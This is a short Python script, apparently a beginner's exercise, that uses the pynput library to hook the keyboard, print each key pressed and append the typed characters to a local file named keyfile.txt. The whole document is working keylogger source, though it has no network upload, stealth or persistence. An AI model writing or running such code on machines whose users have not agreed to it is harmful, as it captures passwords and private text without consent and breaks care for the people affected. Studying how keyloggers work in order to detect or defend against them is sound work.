# Importing pynup library
from pynput import keyboard

# Defining a function to record keystrokes
def keyPressed(key):
    # Printing the presssed key
    print(str(key))
    # Opening a file in append mode to add keystrokes
    with open("keyfile.txt", 'a') as logKey:
        try:
            # Trying to get the character of the key pressed
            char = key.char
            # Writing the character in the log file
            logKey.write(char)
        except:
            #If there is an error in getting the character, printing out an error message
            print("Error getting char")    


# Starting the key listener when this script is run directly
if __name__ == "__main__":
    # Creating a listener object 
    listener = keyboard.Listener(on_press= keyPressed)
    # Starting the listener object
    listener.start()
    # Waiting for user input
    input()